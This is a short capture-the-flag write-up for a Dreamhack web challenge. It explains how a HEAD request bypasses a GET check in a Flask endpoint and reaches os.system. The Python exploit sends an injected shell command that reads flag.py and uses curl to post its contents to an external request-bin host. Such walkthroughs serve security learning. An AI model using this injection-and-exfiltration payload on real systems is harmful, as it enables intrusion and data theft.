# Exercise of web hacking basic
> prob : https://dreamhack.io/wargame/challenges/73/

#### The only endpoint code
```py
@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd
```
The / endpoint has only one method 'GET' to access. But in the block, we can not use command injection if request method is 'GET'. So we can not request with 'GET'.

#### Vuln analyze  
list of request methods : `GET`, `POST`, `OPTIONS`, `HEAD`, ...  
The `HEAD` method asks for a response identical to a `GET` request, but without the response body.  
So if the code define case of `GET` method, the `HEAD` method also should defined. If not, some vuln can occur.  
There are no manual for `HEAD` method in this code. If we request for `HEAD`, we can access to endpoint `index` having request.method:`HEAD` not `GET`. -> _Command injection occur._  

#### Exploit code (or use web proxy tool like burpsuite)
```py
import requests, os

bin_url = 'https://oqwerdj.request.dreamhack.games'
server_url = 'http://host1.dreamhack.games:13639/'
shell = f'data=$(cat flag.py);curl --request POST {bin_url} -d "$data"'

req = f'{server_url}?cmd={shell}'

resp = requests.head(req)

print(resp if resp else 'nothing')
```
_Why use `"$data"` instead of just `$data`? : I'm not sure about it. I think the `curl` version is old so that if data has multiple lines of contents, the result data is lost else first line of content(maybe because space character). So I used double quotation to use `$`meta character, not using single quotation._
